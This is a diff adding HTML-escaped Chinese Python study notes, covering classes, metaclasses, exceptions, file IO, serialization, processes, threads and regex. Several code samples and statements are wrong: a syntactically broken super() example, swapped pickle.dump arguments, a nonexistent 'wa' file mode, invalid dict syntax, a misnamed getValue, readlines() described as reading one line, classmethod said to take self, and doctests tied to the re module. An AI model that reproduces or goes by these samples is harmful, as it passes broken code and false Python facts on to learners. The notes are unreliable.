+并且生成&lt;code&gt;@&amp;lt;方法名&amp;gt;.setter&lt;&#x2F;code&gt;进行直接可写操作。
+在不用调用(set&#x2F;get)方法下，直接操作属性并进行检查判断。（等价于动态绑定属性+属性检查）&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;class A(object):
+
+	@property
+	def score(self):
+		return self.__score
+	@score.setter
+	def score(self,value):
+		if not (isinstance(value,int)):
+			raise ValueError(&amp;#x27;score must be an integer!&amp;#x27;)
+		if (value&amp;lt;0 or value&amp;gt;100):
+			raise ValueError(&amp;#x27;score between 0 and 100!&amp;#x27;)
+		self.__score=value
+#可以通过直接访问方式
+a = A();
+a.score=10
+print(a.score)
+a.score=101 #ValueError
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;4.多重继承&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;MixIn：一个类实现多个功能，可通过多继承方式&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;class A(object):
+	def run(self):
+		print(&amp;#x27;A&amp;#x27;)
+	def run1(self):
+		print(&amp;#x27;run1() A&amp;#x27;)
+class B(object):
+	def run(self):
+		print(&amp;#x27;B&amp;#x27;)
+class C(B,A):
+	pass
+#执行
+a = C()
+a.run()
+a.run1()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;5.定制类，类中特殊函数覆写&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;__str__&lt;&#x2F;code&gt;: print(&amp;lt;类对象&amp;gt;)中打印的内容&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;__repr__&lt;&#x2F;code&gt;: 打印类对象的内容&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;__iter__&lt;&#x2F;code&gt;:设置为迭代对象用于&lt;code&gt;for ... in循环&lt;&#x2F;code&gt;，实现&lt;code&gt;__next__&lt;&#x2F;code&gt;方法&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;__getitem__&lt;&#x2F;code&gt;:跟获取数组下标一样获取数据项，&lt;code&gt;&amp;lt;类对象&amp;gt;[0]、&amp;lt;类对象&amp;gt;[1]&lt;&#x2F;code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;类对象&amp;gt;[:]、&amp;lt;类对象&amp;gt;[:2]&lt;&#x2F;code&gt;也可以切片对象，
+那么需要判断处理&lt;code&gt;isinstance(&amp;lt;变量&amp;gt;,slice)&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;__getattr__&lt;&#x2F;code&gt;:覆写，那么py会先根据这个方法尝试获取属性&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;__call__&lt;&#x2F;code&gt;:类对象可以作为函数调用使用，(PS: s是类对象，那么可以s()进行调用)
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;callable(&amp;lt;类实例&amp;gt;)&lt;&#x2F;code&gt;：判断类对象是否作为&lt;code&gt;可调用的函数&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;6.枚举类&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;定义：
+&lt;code&gt;from enum import Enum&lt;&#x2F;code&gt;
+索引引用[]从1开始&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;Enum(&amp;lt;枚举类型名称&amp;gt;,(&amp;lt;枚举1&amp;gt;,&amp;lt;枚举2&amp;gt;))&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;class A(Enum):&lt;&#x2F;code&gt; 枚举自定义派生类&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;from enum import Enum
+w = Enum(&amp;#x27;weekly&amp;#x27;,(&amp;#x27;Sun&amp;#x27;,&amp;#x27;Mon&amp;#x27;,&amp;#x27;Tue&amp;#x27;,&amp;#x27;Wed&amp;#x27;,&amp;#x27;Thu&amp;#x27;,&amp;#x27;Fri&amp;#x27;,&amp;#x27;Sat&amp;#x27;))
+w(1) #输出 &amp;lt;weekly.Sun:1&amp;gt;
+w(1).name #输出&amp;#x27;Sun&amp;#x27;
+w(1).value #输出1
+
+from enum import unique
+@unique #防止重复值	
+class A(Enum):
+	Sun=0 
+	Mon=1
+	Tue=2
+	Wed=3
+	Thu=4
+	Fri=5
+	Sat=6
+A.Sun.name #输出&amp;#x27;Sun&amp;#x27;
+A.Sun.value #输出0
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;7.使用元类&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;type(&amp;lt;类名&amp;gt;,(&amp;lt;父类&amp;gt;,[&amp;lt;父类&amp;gt; 0~n个]),dict(&amp;lt;方法名&amp;gt;=&amp;lt;绑定的方法&amp;gt;))&lt;&#x2F;code&gt;：动态生成class类&lt;&#x2F;li&gt;
+&lt;li&gt;metaclass
+&lt;ul&gt;
+&lt;li&gt;使用：&lt;code&gt;class &amp;lt;类名&amp;gt;(&amp;lt;父类&amp;gt;,metaclass=&amp;lt;metaclass类&amp;gt;)&lt;&#x2F;code&gt;
+其中metaclass=&lt;code&gt;&amp;lt;metaclass类&amp;gt;&lt;&#x2F;code&gt;，用于生成&amp;lt;类名&amp;gt;实例
+metaclass类
+1.继承自&lt;code&gt;type&lt;&#x2F;code&gt;
+2.实现&lt;code&gt;__new__(cls, name, bases, attrs)&lt;&#x2F;code&gt;方法实现创建新的实例
+cls：&amp;lt;metaclass类&amp;gt;
+name:创建类的名字
+base:创建类继承的父类集合
+attr:创建类的属性&#x2F;方法集合&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;class Model(type):
+	def __new__(cls,name,base,attr):
+		print(attr)
+		attr[&amp;#x27;ok&amp;#x27;]=&amp;#x27;model gen ok&amp;#x27; #添加属性
+		attr[&amp;#x27;add&amp;#x27;]=lambda self,value: self.append(value) #添加方法
+		print(attr)
+		return type.__new__(cls,name,base,attr)
+
+class Test(list,metaclass=Model):
+	pass
+
+if(__name__==&amp;#x27;__main__&amp;#x27;):
+	a = Test()
+	print(a.ok)
+	a.add(1)
+	print(a)
+
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;8.&lt;code&gt;super(&amp;lt;class_type&amp;gt;,&amp;lt;class_instance&amp;gt;)&lt;&#x2F;code&gt;调用父类函数
+按照继承方法的顺序调用，称为MRO(Method Resolution Order)&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;class A(object):
+	super(A,self).__init__():
+	print(&amp;#x27;A&amp;#x27;)
+class B(object):
+	super(B,self).__init__():
+	print(&amp;#x27;B&amp;#x27;)
+class C(A,B):
+	super(C,self).__init__():
+	print(&amp;#x27;C&amp;#x27;)
+C.mro() # &amp;lt;class C&amp;gt;,&amp;lt;class A&amp;gt;,&amp;lt;class B&amp;gt;
+C() 
+#输出 B A C
+#C()
+#开始从C调用super()—&amp;gt;
+#下一个指向A,在A中调用super()-&amp;gt;
+#下一个指向B,在B中调用super()是object
+#最后，打印B-&amp;gt;打印A-&amp;gt;打印C 
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;9.静态方法、类方法、实例方法&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@staticmethod&lt;&#x2F;code&gt; 静态方法 (类&#x2F;实例)访问，不用写默认参数self,不能调用实例变量、类变量等&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;@classmethod&lt;&#x2F;code&gt;类方法，(类&#x2F;实例)访问，需要有默认参数self，不能调用实例变量。&lt;&#x2F;li&gt;
+&lt;li&gt;实例方法，实例访问，需要有默认参数self&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-13-cuo-wu-diao-shi-he-ce-shi&quot;&gt;2.13 错误、调试和测试&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-13-cuo-wu-diao-shi-he-ce-shi&quot; aria-label=&quot;Anchor link for: 2-13-cuo-wu-diao-shi-he-ce-shi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.异常捕获
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;try...except...as e ... finally...&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;try: 
+&amp;lt;执行&amp;gt;
+except &amp;lt;异常类&amp;gt; as e:
+	&amp;lt;执行&amp;gt;
+finally:
+	&amp;lt;执行&amp;gt;
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;logging&lt;&#x2F;code&gt; 记录错误&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;raise&lt;&#x2F;code&gt; 抛出错误&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;2.日志输出
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;assert&lt;&#x2F;code&gt;代替print
+使用&lt;code&gt;python -O &amp;lt;文件名&amp;gt;.py&lt;&#x2F;code&gt;其中 -O大写字母O表示关闭断言
+那么,&lt;code&gt;assert&lt;&#x2F;code&gt;将会被&lt;code&gt;pass&lt;&#x2F;code&gt;代替&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;logging&lt;&#x2F;code&gt; 和android logcat类似&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import logging 
+logging.basicConfig(level=logging.INFO) #添加logging显示等级
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;3.单步调试&lt;code&gt;pdb&lt;&#x2F;code&gt;：python -m pdb xxx.py&lt;&#x2F;li&gt;
+&lt;li&gt;4.单元测试 import &lt;code&gt;unittest&lt;&#x2F;code&gt;模块&lt;&#x2F;li&gt;
+&lt;li&gt;5.文档测试 import &lt;code&gt;re&lt;&#x2F;code&gt;模块&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-14-iobian-cheng&quot;&gt;2.14 IO编程&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-14-iobian-cheng&quot; aria-label=&quot;Anchor link for: 2-14-iobian-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1.文件读写&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;1.获取文件对象 &lt;code&gt;open(&amp;lt;路径&amp;gt;,&#x27;r&#x27;)&lt;&#x2F;code&gt; 获取文件对象，标识符r=读，w=写 默认读取文本文件&lt;&#x2F;li&gt;
+&lt;li&gt;2.读取文件
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;read()&lt;&#x2F;code&gt;一次性读取文件内容&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;read(size)&lt;&#x2F;code&gt;反复调用读取&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;readlines()&lt;&#x2F;code&gt;读取一行&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;3.关闭文件
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;close()&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;with open(&amp;lt;路径&amp;gt;,&#x27;r&#x27;) as f: print(f.read())&lt;&#x2F;code&gt;会自动调用close()，不用自己调用&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;二进制文件&lt;code&gt;rb&lt;&#x2F;code&gt; 标识符表示&lt;&#x2F;li&gt;
+&lt;li&gt;字符编码，读取非UTF-8文件&lt;code&gt;open(&amp;lt;路径&amp;gt;,&#x27;r&#x27;,encoding=&#x27;gbk&#x27;,error=&#x27;ignore&#x27;)&lt;&#x2F;code&gt;
+error=&#x27;ignore&#x27;用于读取编码错误时，忽略处理&lt;&#x2F;li&gt;
+&lt;li&gt;4.写文件
+&lt;ul&gt;
+&lt;li&gt;标识符：&lt;code&gt;w&lt;&#x2F;code&gt;写文本文件，&lt;code&gt;wb&lt;&#x2F;code&gt;写二进制文件 &lt;code&gt;wa&lt;&#x2F;code&gt;(append)追加形式写入(其他是覆盖方式)&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;write()&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;close()&lt;&#x2F;code&gt;写完需要关闭，也可以用&lt;code&gt;with open(...) as f:&lt;&#x2F;code&gt;方式自动关闭&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;2.StringIO和BytesIO&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;1.StringIO&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;from io import StringIO
+f = StringIO() #内存中字符操作
+f.write(&amp;#x27;hello &amp;#x27;)
+f.write(&amp;#x27;world&amp;#x27;)
+f.getValue()# &amp;#x27;hello world&amp;#x27;
+while True:
+	s = f.readlines()
+	if(s==&amp;#x27; &amp;#x27;):
+		break
+	print(s.strip())#strip()去掉空格
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;2.BytesIO&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;from io import BytesIO
+f = BytesIO()
+f = BytesIO(b&amp;#x27;\xe5\xad\x97\xe8\x8a\x82&amp;#x27;)
+f.write(&amp;#x27;字节&amp;#x27;.encode(&amp;#x27;utf-8&amp;#x27;))#写入utf-8编码的字节
+f.close()
+f.read()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;3.os模块(系统信息，创建目录)&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;import os&lt;&#x2F;code&gt;
+&lt;code&gt;os.name&lt;&#x2F;code&gt; posix表示类Unit系统(Linux、Unix、Mac OS),nt表示windows
+&lt;code&gt;os.uname()&lt;&#x2F;code&gt; posix上提供显示系统信息
+&lt;code&gt;os.environ()&lt;&#x2F;code&gt;环境变量
+&lt;code&gt;os.environ().get(&lt;&#x2F;code&gt;PATH&lt;code&gt;)&lt;&#x2F;code&gt; 某个环境变量
+&lt;code&gt;os.path.abspath(&#x27;.&#x27;)&lt;&#x2F;code&gt; 当前目录绝对路径
+&lt;code&gt;os.path.join(&#x27;&#x2F;User&#x27;,&#x27;deskDir&#x27;)&lt;&#x2F;code&gt; 目录下创建新目录
+&lt;code&gt;os.path.isdir(&#x27;x&#x27;)&lt;&#x2F;code&gt;是否目录
+&lt;code&gt;os.path.isfile(&#x27;x&#x27;)&lt;&#x2F;code&gt;是否文件
+&lt;code&gt;os.mkdir(&#x27;&#x2F;User&#x2F;deskDir&#x27;)&lt;&#x2F;code&gt;创建新目录
+&lt;code&gt;os.rmdir(&#x27;&#x2F;User&#x2F;deskDir&#x27;)&lt;&#x2F;code&gt;删除目录
+&lt;code&gt;os.path.split(&#x27;&#x2F;User&#x2F;deskDir&#x27;)&lt;&#x2F;code&gt;目录和最后一个&lt;code&gt;&#x2F;&lt;&#x2F;code&gt;的内容分离
+&lt;code&gt;os.path.splitext(&#x27;&#x2F;User&#x2F;deskDir&#x27;)&lt;&#x2F;code&gt;目录和&lt;code&gt;文件扩展名&lt;&#x2F;code&gt;分离
+&lt;code&gt;os.rename(&#x27;file.txt&#x27;,&#x27;newfile.txt&#x27;)&lt;&#x2F;code&gt;文件重命名
+&lt;code&gt;os.remove(&#x27;file.txt&#x27;)&lt;&#x2F;code&gt;删除文件&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;[x for x in os.listdir(&amp;#x27;.&amp;#x27;) if os.path.isfile(x)]#过滤掉非文件内容
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;shutil模块 有提供文件复制函数&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;4.序列化&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;pickle模块，序列化和反序列化&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import pickle
+d = [1,2,3]
+#序列化
+b=pickle.dumps(d) #生成序列化bytes
+f = open(&amp;#x27;file.txt&amp;#x27;,&amp;#x27;wb&amp;#x27;)
+pickle.dump(f,b) #生成序列化bytes，并写入到文件
+f.close()
+#反序列化
+f.open(&amp;#x27;file.txt&amp;#x27;,&amp;#x27;rb&amp;#x27;)
+pickle.loads(b) #反序列化bytes
+pickle.load(f) #反序列化文件内容
+f.close()
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;JSON&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;{}  		&amp;lt;--&amp;gt;  dict
+[]  		&amp;lt;--&amp;gt;  list
+&amp;quot;string&amp;quot;  	&amp;lt;--&amp;gt;  str
+1234.56  	&amp;lt;--&amp;gt;  int或float
+true&amp;#x2F;false  &amp;lt;--&amp;gt;  True&amp;#x2F;False
+null 		&amp;lt;--&amp;gt;  None
+
+import json
+d = dict(&amp;#x27;name&amp;#x27;:&amp;#x27;n&amp;#x27;,&amp;#x27;age&amp;#x27;:12)
+j = json.dumps(d) #返回json
+json.loads(j) #json转为类型
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;class对象 json和反json
+&lt;code&gt;json.dumps(&amp;lt;class对象&amp;gt;,default=&amp;lt;转换函数&amp;gt;)&lt;&#x2F;code&gt; 转json
+&lt;code&gt;json.loads(&amp;lt;json数据&amp;gt;,object_hook=&amp;lt;转换函数&amp;gt;)&lt;&#x2F;code&gt; 反json&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import json
+def student2dict(stu):
+	return {&amp;#x27;name&amp;#x27;:stu.name,&amp;#x27;age&amp;#x27;:stu.age}
+def dict2student(d):
+	return Student(d[&amp;#x27;name&amp;#x27;],d[&amp;#x27;age&amp;#x27;])
+s = Student(&amp;#x27;a&amp;#x27;,22)
+j = json.dumps(s,default=&amp;#x27;student2dict&amp;#x27;) #class对象转json
+json.loads(j,object_hook=dict2student) #json-&amp;gt;dict对象-&amp;gt;转student对象
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;5.进程和线程&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;多进程&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;fork()&lt;&#x2F;code&gt;在类Unixt系统中，调用1次返回2次，分别是父进程返回和子进程返回。&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;getpid()&lt;&#x2F;code&gt;当前进程id&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;getppid()&lt;&#x2F;code&gt;获得父进程id
+子进程返回0
+父进程返回子进程id&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import os
+pid = os.fork() #Windows没有fork调用
+if pid == 0 : #子进程
+if not pid ==0 : #父进程
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;multiprocessing 跨平台多进程模块&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;from multiprocessing import Process
+import os 
+def run_child_proc(name):
+	print(&amp;#x27;name %s&amp;#x27;%name)
+if(__name__==&amp;#x27;__main__&amp;#x27;):
+	#子进程执行函数run_child_proc,args是dict类型所以加,
+	p = Process(target=run_child_proc,args=(&amp;#x27;test&amp;#x27;,)) #创建进程
+	p.start() #子进程开始启动
+	p.join() #等待子进程p执行完成后，用于进程协调同步
+	print(&amp;#x27;child proc closed&amp;#x27;)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Pool 多进程&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;from multiprocessing import Pool
+import os,time
+def run_child_proc(name):
+	time.sleep(1 * 1)
+	print(&amp;#x27;child proc name %s&amp;#x27;%name,&amp;#x27; pid:&amp;#x27;,os.getpid())
+
+if(__name__==&amp;#x27;__main__&amp;#x27;):
+	print(&amp;#x27;parent Process pid = %s&amp;#x27;%os.getpid())
+	p = Pool(3)
+	for i in range(3):
+		p.apply_async(run_child_proc,(i,))#多进程异步执行,进程池限制3个进程 默认4个
+	print(&amp;#x27;Wait&amp;#x27;)
+	p.close() #不允许添加新的进程
+	p.join() #等待进程全部执行完成
+	print(&amp;#x27; All child proc closed! &amp;#x27;)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;子进程&lt;code&gt;subprocess&lt;&#x2F;code&gt;模块&lt;&#x2F;li&gt;
+&lt;li&gt;进程间通信通过Queue、Pipes实现&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;多线程&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;_thread&lt;&#x2F;code&gt;和&lt;code&gt;threading&lt;&#x2F;code&gt;模块&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import threading
+
+def new_thread_run():
+	print(&amp;#x27;threading:%s&amp;#x27;%threading.current_thread().name)
+print(&amp;#x27;main thread:%s&amp;#x27;%threading.current_thread().name)
+#不要name，py会自动起名字
+t = threading.Thread(target=new_thread_run,name=&amp;#x27;new_thread&amp;#x27;)
+t.start()
+t.join()
+print(&amp;#x27;main thread:%s closed!&amp;#x27;%threading.current_thread().name)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Lock 线程上锁&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import threading,time
+value=0
+lock = threading.Lock() #获得锁对象
+def changeValue():
+	global value
+	value=value+1
+	time.sleep(0.0001)
+	value=value-1
+
+def new_thread_run():
+	lock.acquire() #获取锁
+	for i in range(1000):
+		changeValue()
+	print(threading.current_thread().name,&amp;#x27;value&amp;#x27;,value)
+	lock.release() #释放锁
+t1 = threading.Thread(target=new_thread_run)
+t2 = threading.Thread(target=new_thread_run)
+t1.start()
+t2.start()
+t1.join()
+t2.join()
+print(threading.current_thread().name,&amp;#x27;value&amp;#x27;,value)
+print(&amp;#x27;main thread closed !&amp;#x27;)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;ThreadLocal:每个线程单独存储线程内部使用的变量&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import threading
+
+global_local = threading.local() #线程本地变量
+def process_t():
+	print(&amp;#x27;thead: %s tag:%s&amp;#x27;%(threading.current_thread().name,global_local.tag))
+def new_thread_run(tag):
+	global_local.tag = tag
+	process_t()
+t1 = threading.Thread(target=new_thread_run,args=(&amp;#x27;OK&amp;#x27;,))
+t2 = threading.Thread(target=new_thread_run,args=(&amp;#x27;HAO&amp;#x27;,))
+t1.start()
+t2.start()
+t1.join()
+t2.join()
+print(&amp;#x27;main thread closed !&amp;#x27;)
+	
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre&gt;&lt;code&gt;  - 多任务模型，切换作业有代价，就是保存&amp;#x2F;恢复现场
+  - Nginx 支持异步IO的Web服务器
+  - 协程：Python语言中，单线程的异步编程模型
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;分布式进程:&lt;code&gt;multiprocessing&lt;&#x2F;code&gt;的子模块&lt;code&gt;managers&lt;&#x2F;code&gt;支持&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-15-zheng-ze-biao-da-shi&quot;&gt;2.15 正则表达式&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-15-zheng-ze-biao-da-shi&quot; aria-label=&quot;Anchor link for: 2-15-zheng-ze-biao-da-shi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;import re&lt;&#x2F;code&gt;：导入&lt;code&gt;re&lt;&#x2F;code&gt;模块&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;r&lt;&#x2F;code&gt;：正则表达式前面加&lt;code&gt;r&lt;&#x2F;code&gt;忽略python中字符串的转义(PS:&lt;code&gt;\\&lt;&#x2F;code&gt;== r&lt;code&gt;\&lt;&#x2F;code&gt;，字符串中输入&lt;code&gt;\&lt;&#x2F;code&gt;要转义)&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;re.match(&amp;lt;正则表达式&amp;gt;,&amp;lt;需要匹配的字符串&amp;gt;)&lt;&#x2F;code&gt;：匹配&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;re.compile(&amp;lt;正则表达式&amp;gt;)&lt;&#x2F;code&gt;：预编译&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;groups()&lt;&#x2F;code&gt;获得所有匹配的组&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;group(0)&lt;&#x2F;code&gt;默认匹配的组&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;group(1)，group(2)&lt;&#x2F;code&gt;表示要提取的组1,2 正则表达式中用&lt;code&gt;()&lt;&#x2F;code&gt;表示提取&lt;&#x2F;li&gt;
+&lt;li&gt;正则表达式匹配过程(对于经常匹配的，预编译可以提高效率)
+&lt;ul&gt;
+&lt;li&gt;1.编译正则表达式，如果正则表达式不合法，报错。&lt;&#x2F;li&gt;
+&lt;li&gt;2.用编译后的正则表达式去匹配字符串&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-16-nei-jian-mo-kuai&quot;&gt;2.16 内建模块&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-16-nei-jian-mo-kuai&quot; aria-label=&quot;Anchor link for: 2-16-nei-jian-mo-kuai&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.&lt;code&gt;datetime&lt;&#x2F;code&gt; 处理日期和时间标准库
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;from datetime import datetime&lt;&#x2F;code&gt;: datetime.now()获取现在时间&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;import datetime&lt;&#x2F;code&gt;: datetime.datetime.now()获取现在时间&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;2.&lt;code&gt;collections&lt;&#x2F;code&gt; 集合标准库&lt;&#x2F;li&gt;
+&lt;li&gt;3.&lt;code&gt;base64&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;4.&lt;code&gt;struct&lt;&#x2F;code&gt; 解决bytes和其他数据类型转换的库&lt;&#x2F;li&gt;
+&lt;li&gt;5.&lt;code&gt;hashlib&lt;&#x2F;code&gt; 摘要算法库(MD5,SHA1)，生成hash值&lt;&#x2F;li&gt;
+&lt;li&gt;6.&lt;code&gt;hmac&lt;&#x2F;code&gt;： (数据+密钥)的方式生成摘要hash值&lt;&#x2F;li&gt;
+&lt;li&gt;7.&lt;code&gt;itertools&lt;&#x2F;code&gt;:操作迭代对象的库&lt;&#x2F;li&gt;
